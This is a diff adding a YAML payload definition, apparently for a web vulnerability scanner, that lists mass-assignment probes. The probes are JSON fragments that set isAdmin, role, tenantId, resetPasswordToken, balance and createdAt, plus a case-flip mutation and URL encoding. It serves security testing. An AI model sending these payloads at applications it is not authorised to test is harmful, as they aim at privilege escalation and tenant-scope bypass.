@@ -1,0 +1,49 @@
+family_id: mass_assignment
+description: >-
+  Mass-assignment / over-posting probes — append privileged-looking
+  attributes to JSON / form bodies and observe whether the server accepts
+  them. Conservative seeds use marker properties (argusCanary) so the
+  validator can confirm the property landed in storage without elevating
+  any real privilege.
+cwe_ids: [915, 284]
+owasp_top10:
+  - 'A04:2021'
+  - 'A08:2021'
+risk_level: medium
+requires_approval: false
+oast_required: false
+payloads:
+  - id: is_admin_true
+    template: '{"isAdmin":true}'
+    confidence: likely
+    notes: Classic admin-flag append; differential vs control profile confirms.
+  - id: role_admin
+    template: '{"role":"admin"}'
+    confidence: likely
+    notes: Role-string append; tests whitelist/blacklist policy on user updates.
+  - id: tenant_override
+    template: '{"tenantId":"{canary}"}'
+    confidence: confirmed
+    notes: Tenant-id override marker; canary in storage confirms scope bypass.
+  - id: balance_marker
+    template: '{"balance":1}'
+    confidence: suspected
+    notes: Balance / quota field marker; differential vs control account.
+  - id: reset_password_token
+    template: '{"resetPasswordToken":"{canary}"}'
+    confidence: suspected
+    notes: Token-field append; tests profile-update endpoint scope.
+  - id: created_at_marker
+    template: '{"createdAt":"1970-01-01T00:00:00Z"}'
+    confidence: suspected
+    notes: Server-managed timestamp override; differential confirms accept.
+mutations:
+  - name: case_flip
+    description: JSON property names are case-sensitive — flips produce known errors.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw JSON / form payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for form-body sinks.
